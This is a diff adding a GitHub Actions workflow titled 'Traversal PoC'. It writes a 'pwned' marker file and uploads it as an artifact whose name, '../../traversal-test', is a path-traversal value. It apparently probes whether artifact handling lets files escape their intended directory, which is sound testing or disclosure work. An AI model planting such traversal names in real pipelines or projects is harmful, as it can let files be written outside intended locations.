@@ -1,0 +1,14 @@
+name: Traversal PoC
+on:
+  workflow_dispatch:
+jobs:
+  upload-artifact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create malicious file
+        run: echo "pwned" > poc.txt
+      - name: Upload artifact with traversal name
+        uses: actions/upload-artifact@v4
+        with:
+          name: "../../traversal-test"
+          path: poc.txt
